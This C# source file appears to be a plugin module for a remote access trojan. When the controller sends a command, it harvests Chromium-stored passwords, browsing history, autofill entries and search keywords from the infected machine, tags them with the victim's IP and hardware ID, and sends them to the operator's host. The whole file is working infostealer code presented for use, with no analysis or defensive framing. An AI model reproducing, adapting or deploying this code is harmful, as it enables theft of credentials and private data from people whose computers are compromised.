using PacketLib.Utils;
using PacketLib.Packet;
using PacketLib;
using System.Threading;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        public static void Main(LoadingAPI loadingAPI)
        {       
            switch (loadingAPI.CurrentPacket.PacketType)
            {
                case PacketType.RECOVERY_PASSWORDS:
                    PasswordsPacket passwordsPacket = new PasswordsPacket(ChromiumRecovery.Recovery(), loadingAPI.BaseIp, loadingAPI.HWID);
                    ClientSender(loadingAPI.Host, loadingAPI.Key, passwordsPacket);
                    break;

                case PacketType.RECOVERY_HISTORY:
                    HistoryPacket historyPacket = new HistoryPacket(ChromiumHistory.Recovery(), loadingAPI.BaseIp, loadingAPI.HWID);
                    ClientSender(loadingAPI.Host, loadingAPI.Key, historyPacket);
                    break;

                case PacketType.RECOVERY_AUTOFILL:
                    AutofillPacket autofillPacket = new AutofillPacket(ChromiumAutofill.Recovery(), loadingAPI.BaseIp, loadingAPI.HWID);
                    ClientSender(loadingAPI.Host, loadingAPI.Key ,autofillPacket);
                    break;

                case PacketType.RECOVERY_KEYWORDS:
                    KeywordsPacket keywordsPacket = new KeywordsPacket(ChromiumKeywords.Recovery(), loadingAPI.BaseIp,loadingAPI.HWID);
                    ClientSender(loadingAPI.Host, loadingAPI.Key, keywordsPacket);
                    break;

                case PacketType.RECOVERY_ALL:
                    passwordsPacket = new PasswordsPacket(ChromiumRecovery.Recovery(), loadingAPI.BaseIp, loadingAPI.HWID);
                    historyPacket = new HistoryPacket(ChromiumHistory.Recovery(), loadingAPI.BaseIp, loadingAPI.HWID);
                    autofillPacket = new AutofillPacket(ChromiumAutofill.Recovery(), loadingAPI.BaseIp, loadingAPI.HWID);
                    keywordsPacket = new KeywordsPacket(ChromiumKeywords.Recovery(), loadingAPI.BaseIp, loadingAPI.HWID);

                    ClientSender(loadingAPI.Host, loadingAPI.Key, passwordsPacket);
                    ClientSender(loadingAPI.Host, loadingAPI.Key, historyPacket);
                    ClientSender(loadingAPI.Host, loadingAPI.Key, autofillPacket);
                    ClientSender(loadingAPI.Host, loadingAPI.Key, keywordsPacket);
                    break;

                default:
                    return;
            }
            Miscellaneous.CleanMemory();
        }
        private static void ClientSender(Host host, string key, IPacket packet)
        {
            ClientHandler clientHandler = new ClientHandler(host, key);
            clientHandler.ConnectStart();
            while (!clientHandler.Connected)
                Thread.Sleep(125);

            clientHandler.SendPacket(packet);
        }
    }
}
